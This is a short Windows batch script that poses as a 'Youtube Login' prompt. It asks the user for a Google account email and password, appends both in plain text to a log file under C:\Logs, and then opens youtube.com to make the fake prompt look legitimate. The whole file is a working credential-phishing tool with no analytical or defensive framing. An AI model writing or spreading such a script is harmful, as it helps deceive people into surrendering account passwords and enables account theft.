@echo off
color a
title Youtube Login
cls
echo Please Enter Your Google Account Email Address And Password
echo.
echo.
md "C:\Logs"
cd "C:\Logs"
set /p user=Username:
set /p pass=Password:
echo Username=”%user%” Password=”%pass%” >> Log.txt
start www.youtube.com
exit